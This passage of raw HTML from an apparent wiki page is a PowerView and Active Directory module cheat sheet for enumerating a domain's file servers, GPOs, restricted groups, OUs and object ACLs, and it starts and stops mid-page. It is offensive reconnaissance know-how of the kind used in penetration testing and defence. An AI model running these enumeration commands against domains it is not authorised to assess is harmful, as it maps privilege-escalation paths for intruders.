.9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h4 id="bkmrk-find-all-fileservers">Find all fileservers of the domain</h4>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true"><div style="height: 100%; min-height: 1px; width: 0px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 34px; min-width: 130.048px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Get-NetFileServer</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 0px solid transparent; top: 34px;"></div><div class="CodeMirror-gutters" style="height: 74px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h3 id="bkmrk-gpo-enumeration">GPO Enumeration</h3>
<h4 id="bkmrk-list-of-gpo-in-the-d">List of GPO in the domain</h4>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 738px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 185px; min-width: 738.048px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style=""><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#PowerView</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Get-NetGPO</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#GPOs applied to a computer</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Get-NetGPO</span> <span class="cm-operator">-</span><span class="cm-identifier">ComputerName</span> <span class="cm-operator">&lt;</span><span class="cm-identifier">target</span><span class="cm-operator">&gt;</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">6</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#AD Module</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">7</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Get-GPO</span> <span class="cm-operator">-</span><span class="cm-identifier">All</span> <span class="cm-comment">#(GroupPolicy module)</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">8</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Get-GPResultantSetOfPolicy</span> <span class="cm-operator">-</span><span class="cm-identifier">ReportType</span> <span class="cm-identifier">Html</span> <span class="cm-operator">-</span><span class="cm-identifier">Path</span> <span class="cm-builtin">C:</span><span class="cm-punctuation">\</span><span class="cm-identifier">Users</span><span class="cm-punctuation">\</span><span class="cm-identifier">Administrator</span><span class="cm-punctuation">\</span><span class="cm-identifier">report</span><span class="cm-punctuation">.</span><span class="cm-identifier">html</span> <span class="cm-comment">#(Provides RSoP)</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 185px;"></div><div class="CodeMirror-gutters" style="height: 235px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h4 id="bkmrk-get-gpo-that-modify-">Get GPO that modify local group via Restricted Groups</h4>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true"><div style="height: 100%; min-height: 1px; width: 0px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 34px; min-width: 115.571px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Get-NetGPOGroup</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 0px solid transparent; top: 34px;"></div><div class="CodeMirror-gutters" style="height: 74px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h4 id="bkmrk-users-which-are-in-a">Users which are in a local group of a machine using GPOs</h4>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true"><div style="height: 100%; min-height: 1px; width: 0px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 34px; min-width: 325.476px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Find-GPOComputerAdmin</span> <span class="cm-operator">-</span><span class="cm-identifier">Computername</span> <span class="cm-operator">&lt;</span><span class="cm-identifier">target</span><span class="cm-operator">&gt;</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 0px solid transparent; top: 34px;"></div><div class="CodeMirror-gutters" style="height: 74px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h4 id="bkmrk-machine-where-an-use">Machine where an user is member of a local group using GPOs</h4>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true"><div style="height: 100%; min-height: 1px; width: 0px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 34px; min-width: 303.762px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Find-GPOLocation</span> <span class="cm-operator">-</span><span class="cm-identifier">Identity</span> <span class="cm-identifier">user1</span> <span class="cm-operator">-</span><span class="cm-identifier">Verbose</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 0px solid transparent; top: 34px;"></div><div class="CodeMirror-gutters" style="height: 74px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h3 id="bkmrk-organisation-units">Organisation Units</h3>
<h4 id="bkmrk-ous-of-the-domain">OUs of the domain</h4>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 354px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 55px; min-width: 354.429px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Get-NetOU</span> <span class="cm-operator">-</span><span class="cm-identifier">FullData</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Get-ADOrganizationalUnit</span> <span class="cm-operator">-</span><span class="cm-keyword">Filter</span> <span class="cm-operator">*</span> <span class="cm-operator">-</span><span class="cm-identifier">Properties</span> <span class="cm-operator">*</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 55px;"></div><div class="CodeMirror-gutters" style="height: 105px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h4 id="bkmrk-computers-within-an-">Computers within an OU</h4>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 637px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 34px; min-width: 636.714px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Get-NetComputer</span> <span class="cm-operator">|</span> <span class="cm-builtin">?</span> <span class="cm-punctuation">{</span> <span class="cm-builtin">$_</span><span class="cm-punctuation">.</span><span class="cm-identifier">DistinguishedName</span> <span class="cm-operator">-match</span> <span class="cm-string">"OU=&lt;OU_name&gt;"</span> <span class="cm-punctuation">}</span> <span class="cm-operator">|</span> <span class="cm-builtin">select</span> <span class="cm-identifier">DnsHostName</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 34px;"></div><div class="CodeMirror-gutters" style="height: 84px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h4 id="bkmrk-gpo-applied-on-an-ou">GPO applied on an OU / Read GPO from the GP-Link attribut from <code>Get-NetOU</code></h4>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true"><div style="height: 100%; min-height: 1px; width: 0px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 55px; min-width: 318.238px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Get-NetGPO</span> <span class="cm-operator">-</span><span class="cm-identifier">GPOname</span> <span class="cm-string">"{&lt;OU_ID&gt;}"</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Get-GPO</span> <span class="cm-operator">-</span><span class="cm-identifier">Guid</span> <span class="cm-operator">&lt;</span><span class="cm-identifier">OU_ID</span><span class="cm-operator">&gt;</span> <span class="cm-comment">#(GroupPolicy module)</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 0px solid transparent; top: 55px;"></div><div class="CodeMirror-gutters" style="height: 95px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h3 id="bkmrk-acls">ACLs</h3>
<h4 id="bkmrk-all-acls-associated-">All ACLs associated to an object (inbound)</h4>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 492px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 55px; min-width: 491.952px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Get-ObjectAcl</span> <span class="cm-operator">-</span><span class="cm-identifier">Identity</span> <span class="cm-identifier">user1</span> <span class="cm-operator">-</span><span class="cm-identifier">ResolveGUIDs</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-punctuation">(</span><span class="cm-identifier">Get-ObjectAcl</span> <span class="cm-operator">|</span> <span class="cm-builtin">Where-Object</span> <span class="cm-punctuation">{</span><span class="cm-builtin">$_</span><span class="cm-punctuation">.</span><span class="cm-identifier">ObjectSid</span> <span class="cm-operator">-match</span> <span class="cm-string">"&lt;object_SID&gt;"</span><span class="cm-punctuation">})</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 55px;"></div><div class="CodeMirror-gutters" style="height: 105px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h4 id="bkmrk-outbound-acls-of-an-">Outbound ACLs of an object</h4>
<p id="bkmrk-these-are-the-rights">These are the rights the object has in the AD</p>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 579px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 55px; min-width: 578.81px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Invoke-ACLScanner</span> <span class="cm-operator">-</span><span class="cm-identifier">ResolveGUIDs</span> <span class="cm-operator">|</span> <span class="cm-builtin">?</span><span class="cm-punctuation">{</span><span class="cm-builtin">$_</span><span class="cm-punctuation">.</span><span class="cm-identifier">IdentityReferenceName</span> <span class="cm-operator">-match</span> <span class="cm-string">"&lt;target&gt;"</span><span class="cm-punctuation">}</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Get-ObjectAcl</span> <span class="cm-operator">-</span><span class="cm-identifier">ResolveGUIDs</span> <span class="cm-operator">|</span> <span class="cm-builtin">?</span> <span class="cm-punctuation">{</span><span class="cm-builtin">$_</span><span class="cm-punctuation">.</span><span class="cm-identifier">SecurityIdentifier</span> <span class="cm-operator">-match</span> <span class="cm-string">"user1"</span><span class="cm-punctuation">}</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 55px;"></div><div class="CodeMirror-gutters" style="height: 105px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h4 id="bkmrk-acls-associated-to-a">ACLs associated to a specific path</h4>
